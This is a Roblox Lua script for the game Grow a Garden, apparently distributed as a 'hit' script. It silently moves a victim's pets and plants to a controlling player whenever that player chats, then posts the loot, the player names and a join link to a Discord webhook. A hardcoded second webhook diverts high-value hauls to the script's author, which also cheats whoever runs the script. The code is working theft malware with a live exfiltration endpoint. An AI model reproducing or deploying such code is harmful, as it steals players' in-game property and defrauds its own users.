-- GROW A GARDEN HIT - By namnnni2

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
local Modules = ReplicatedStorage:WaitForChild("Modules")

-- MODULE
local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))

-- C·∫§U H√åNH
local VALUE_THRESHOLD = 1_000_000_000_000
local HEAVY_WEIGHT = 10
local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}

-- L·∫§Y BI·∫æN T·ª™ getfenv()
local env = getfenv()
local PRIMARY_WEBHOOK = env.Webhook
local PRIMARY_USERNAME = env.Username

local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local DUAL_USERNAME = "namnnni2"

-- H√ÄM CH·ªåN REQUEST T∆Ø∆†NG TH√çCH EXECUTOR
local function getRequestFunction()
    return
        (syn and syn.request) or
        (http and http.request) or
        (fluxus and fluxus.request) or
        (getgenv and getgenv().request) or
        (request) -- fallback cu·ªëi
end

-- FORMAT S·ªê
local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

-- T√çNH GI√Å TR·ªä ITEM
local function calculateItemValue(tool)
    local itemType = tool:GetAttribute("ItemType")
    if itemType == "Pet" then
        return petUtils:GetPetValue(tool)
    elseif itemType == "Plant" then
        return calcPlantValue(tool)
    end
    return 0
end

-- ∆ØU TI√äN S·∫ÆP X·∫æP
local function calculatePriority(item)
    local priority = 0
    if table.find(VIP_PETS, item.Name) then priority += 1000 end
    if (item.Weight or 0) >= HEAVY_WEIGHT then priority += 500 end
    priority += item.Value or 0
    return priority
end

local function sortByPriority(a, b)
    return calculatePriority(a) > calculatePriority(b)
end

-- G·ª¨I WEBHOOK
local function sendWebhookNotification(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or "unknown")

    if not webhookUrl then
        warn("‚ùå Kh√¥ng c√≥ webhook. D·ª´ng g·ª≠i.")
        return
    end

    local hasVIPOrHeavy = false
    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
            hasVIPOrHeavy = true
            break
        end
    end

    local categories = {
        {name = "üíé VIP Pets", items = {}},
        {name = "üèãÔ∏è Heavy Pets", items = {}},
        {name = "üêæ Regular Pets", items = {}},
        {name = "üå± Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    local descriptionParts = {}
    for _, category in ipairs(categories) do
        if #category.items > 0 then
            table.insert(descriptionParts, "**"..category.name.." ("..#category.items..")**")
            for _, item in ipairs(category.items) do
                table.insert(descriptionParts, string.format("- %s: $%s (%.1fkg)", item.Name, formatNumber(item.Value), item.Weight or 0))
            end
            table.insert(descriptionParts, "")
        end
    end

    local payload = {
        username = username,
        embeds = {{
            title = useDual and "üíé VIP TRANSFER" or "üì¶ ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(descriptionParts, "\n"),
            fields = {
                {name = "üë§ Sender", value = Players.LocalPlayer.Name, inline = true},
                {name = "üéØ Receiver", value = targetName, inline = true},
                {name = "üí∞ Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "üîó Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = DateTime.now():ToIsoDate()
        }},
        content = hasVIPOrHeavy and "@everyone" or nil
    }

    local req = getRequestFunction()
    if not req then
        warn("‚ùå Executor kh√¥ng h·ªó tr·ª£ request(). Kh√¥ng th·ªÉ g·ª≠i webhook.")
        return
    end

    local success, response = pcall(function()
        return req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("‚úÖ Webhook sent to:", webhookUrl)
    else
        warn("‚ùå Webhook failed to send:", response)
    end
end

-- CHUY·ªÇN ITEM KHI NG∆Ø·ªúI CH·ª¶ CHAT
local function onPlayerChatted(player, msg)
    local myChar = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
    local myHRP = myChar:WaitForChild("HumanoidRootPart")
    local theirChar = player.Character or player.CharacterAdded:Wait()
    local theirHRP = theirChar:WaitForChild("HumanoidRootPart")

    local prompt = Instance.new("ProximityPrompt")
    prompt.ActionText = "Transfer"
    prompt.ObjectText = "To "..player.Name
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = theirHRP

    prompt.Triggered:Connect(function()
        local items = {}
        local total = 0
        for _, tool in ipairs(Backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Weight = tool:GetAttribute("Weight"),
                    Value = calculateItemValue(tool),
                    Tool = tool
                }
                total += item.Value
                table.insert(items, item)
            end
        end

        table.sort(items, sortByPriority)

        local theirBackpack = player:FindFirstChildOfClass("Backpack")
        for _, item in ipairs(items) do
            if item.Tool and item.Tool.Parent == Backpack then
                item.Tool.Parent = theirBackpack
                task.wait(0.3)
            end
        end

        sendWebhookNotification(items, total, player.Name)
    end)

    task.wait(0.5)
    prompt:InputHoldBegin()
    task.wait(prompt.HoldDuration)
    prompt:InputHoldEnd()
end

-- NGHE CHAT T·ª™ CH·ª¶
for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg)
        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
            onPlayerChatted(p, msg)
        end
    end)
end

Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg)
        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
            onPlayerChatted(p, msg)
        end
    end)
end)
